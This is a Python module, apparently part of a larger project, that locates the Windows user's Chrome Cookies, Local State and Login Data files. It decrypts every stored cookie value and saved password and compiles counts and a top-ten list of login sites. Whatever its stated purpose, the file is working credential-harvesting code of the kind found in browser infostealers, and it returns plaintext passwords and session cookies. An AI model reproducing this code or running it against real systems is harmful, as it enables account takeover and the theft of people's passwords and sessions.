import base64
import json
import os
import sqlite3
import binascii
import win32crypt
from Crypto.Cipher import AES

from models.chrome import ChromeCookie, ChromeUser
from models.firefox import FirefoxCookie, FirefoxUsuarios
from models.edge import EdgeCookie, edge_usuario_contrasenia
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from repositories.cookie_repository import obtener_llave_session, desecriptar_dato

class CookieRepository_Chrome:
    def __init__(self):
       self.cookies_path_chrome = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default","Network", "Cookies")
       self.chrome_path_llaves = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
       self.chrome_path_user = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

    def get_chrome_cookies(self):
        cookies = []
        llave = obtener_llave_session(self.chrome_path_llaves)
        with sqlite3.connect(self.cookies_path_chrome) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies")
            for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
                try:
                    encrypted_value = desecriptar_dato(encrypted_value, llave)
                    cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
                except Exception as e:
                    print(f"Error al desencriptar la cookie: {e}")
        return cookies

    def get_chrome_cookies_session(self):
        cookies = []
        llave = obtener_llave_session(self.chrome_path_llaves)
        with sqlite3.connect(self.cookies_path_chrome) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies WHERE is_secure = 1")
            for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
                try:
                    encrypted_value = desecriptar_dato(encrypted_value, llave)
                    cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
                except Exception as e:
                    print(f"Error al desencriptar la cookie: {e}")
        return cookies

    def obtener_contrasenias(self):
        contrasenias = []
        llave = obtener_llave_session(self.chrome_path_llaves)
        with sqlite3.connect(self.chrome_path_user) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified FROM logins")
            for origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified in cursor.fetchall():
                try:
                    password_value = desecriptar_dato(password_value, llave)
                    contrasenias.append(ChromeUser(origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified))
                except Exception as e:
                    print(f"Error al desencriptar la contraseña: {e}")
        return contrasenias

    def numeros_paginas_encontradas_sin_repetir(self):
    # obtener el numero de paginas encontradas sin repetir y su  url
        lista_paginas = []
        with sqlite3.connect(self.chrome_path_user) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC")
            for origin_url, count in cursor.fetchall():
                lista_paginas.append((origin_url, count))
        return lista_paginas

    def top_ten_paginas_encontradas_sin_repetir(self):
    # obtener el top 10 de paginas encontradas sin repetir y su  url
        lista_paginas = []
        with sqlite3.connect(self.chrome_path_user) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC LIMIT 10")
            for origin_url, count in cursor.fetchall():
                lista_paginas.append((origin_url, count))
        return lista_paginas

    def numero_contrasenias_encontradas(self):
    # obtener el numero de contraseñas encontradas
        with sqlite3.connect(self.chrome_path_user) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL")
            row = cursor.fetchone()
            return row[0]

    def count_session_cookies(self):
    # obtener el numero de cookies de session
        with sqlite3.connect(self.cookies_path_chrome) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM cookies WHERE is_secure = 1")
            row = cursor.fetchone()
        return row[0] if row else 0








